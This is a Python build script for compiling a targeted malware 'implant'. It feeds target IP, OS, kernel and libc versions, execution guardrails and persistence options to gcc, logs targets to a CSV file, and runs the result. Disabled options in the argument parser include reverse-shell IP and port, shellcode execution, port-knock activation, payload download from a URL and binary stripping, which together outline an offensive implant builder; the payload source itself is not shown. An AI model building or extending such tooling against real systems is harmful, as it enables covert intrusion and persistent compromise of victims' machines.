import datetime
import argparse
import binascii
import os
import subprocess
import csv
import os.path as filesys

##### Desired parameters
# Architecture
# OS
# Libc Version (if Available)
# Kernel Version (if Available)
# Functionality
# Execution Guardrails (if Required)
# Persistence Mechanism (if Required)


parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')

parser.add_argument("-d", "--debug", action="store_true",
        help="compile with debugging")
parser.add_argument("-ip", "--ipAddress",type=str,
        help="target address", metavar='', default="unknown")
parser.add_argument("-do", "--domain", type=str,
        help="target domain", metavar='', default="unknown")
"""
parser.add_argument("-p", "--platform",type=str, metavar='',
        help="platform", default="unknown")
"""
parser.add_argument("-a", "--architecture",type=str, metavar='', 
        help="system architecture", default="unknown")
parser.add_argument("-os", "--os",type=str, metavar='',
        help="operating system", default="unknown")
parser.add_argument("-lv", "--libcversion", type=str, metavar='',
        help="libc version", default="unknown")
parser.add_argument("-kv", "--kernversion", type=str, metavar='',
        help="kernel  version", default="unknown")
parser.add_argument("-fc", "--functionality", type=str, metavar='',
        help="functionality", default="unknown")
parser.add_argument("-eg", "--execguardrails", type=str, metavar='',
        help="execution guardrails", default="unknown")
parser.add_argument("-pm", "--persistmech", type=str, metavar='',
        help="persistence mechanism", default="unknown")

"""
parser.add_argument("-vn", "--versionNumber",type=str, metavar='',
        help="version no.", default="unknown")
parser.add_argument("-pay", "--payload",type=str, metavar='',
        help="payload type", default="listener")
"""
parser.add_argument("-o", "--outputName",type=str, metavar='',
        help="output filename", default="implant")
"""
parser.add_argument("-intfc", "--interface",type=str, metavar='',
        help="listener interface") 
parser.add_argument("-act", "--activate", type=str, metavar='',
        help="activation method")
parser.add_argument("-key", "--key",type=str, metavar='',
        help="activation key")
parser.add_argument("-size", "--size",type=str, metavar='',
        help="number of knocks to listen for")
parser.add_argument("-trig", "--trigger",type=str, metavar='',
        help="target URL to check")
parser.add_argument("-delayT", "--timeDelay", type=str, metavar='',
        help="time in between checks")
parser.add_argument("-delayD", "--dateDelay", type=str, metavar='',
        help="sleep until this date")
parser.add_argument("-atkD", "--downloadURL",type=str, metavar='',
        help="download file from this url")
parser.add_argument("-atkB", "--bang", action="store_true", 
        help="execute bang attack function")
parser.add_argument("-atkSc", "--loadShellcode", action="store_true", 
        help="execute shellcode")
parser.add_argument("-atkR", "--reverseShell",action="store_true", 
        help="run a reverse shell")
parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
        help="reverse shell IP")  
parser.add_argument("-revport", "--reversePort",type=str, metavar='',
        help="reverse shell Port")                     
parser.add_argument("-per", "--persistence",type=str, metavar='',
        help="persistence mechanism (not implemented)") 
parser.add_argument("-notes", "--notes",type=str, metavar='',
        help="notes", default="No Notes")
parser.add_argument("-strip", "--strip", action="store_true", 
        help="strip the binary")
parser.add_argument("-static", "--static", action="store_true", 
        help="statically link the binary")
"""
args = parser.parse_args()

log_exists = filesys.isfile('log.csv')

with open('log.csv', mode='a+') as log_file:
    
    log_writer = csv.writer(log_file, delimiter='\t', quotechar='"', quoting=csv.QUOTE_MINIMAL)
    if (log_exists != 1):
        fieldnamesList = ["datetime", "ipAddress", "outputName"]
        log_writer.writerow(fieldnamesList)

    log_writer.writerow([str(datetime.datetime.now()), str(args.ipAddress), str(args.outputName)])
    

cmdString = ["gcc", "test.c", "-o", args.outputName]

if args.debug:
    cmdString.insert(1, "-D DEBUG")

if args.ipAddress != "unknown":
    cmdString.insert(1, "-D IPNUM=\"" +(args.ipAddress)+ "\"")

if args.architecture != "unknown":
    cmdString.insert(1, "-D ARCH=\"" +(args.architecture)+ "\"")

if args.os != "unknown":
    cmdString.insert(1, "-D OS=\"" +(args.os)+ "\"")

if args.libcversion != "unknown":
    cmdString.insert(1, "-D LIBV=\"" +(args.libcversion)+ "\"")

if args.kernversion != "unknown":
    cmdString.insert(1, "-D KERV=\"" +(args.kernversion)+ "\"")

if args.functionality != "unknown":
    cmdString.insert(1, "-D FUNC=\"" +(args.functionality)+ "\"")

if args.execguardrails != "unknown":
    cmdString.insert(1, "-D EXEC=\"" +(args.execguardrails)+ "\"")

if args.persistmech != "unknown":
    cmdString.insert(1, "-D PERM=\"" +(args.persistmech)+ "\"")

subprocess.run(cmdString)

subprocess.run("./implant")

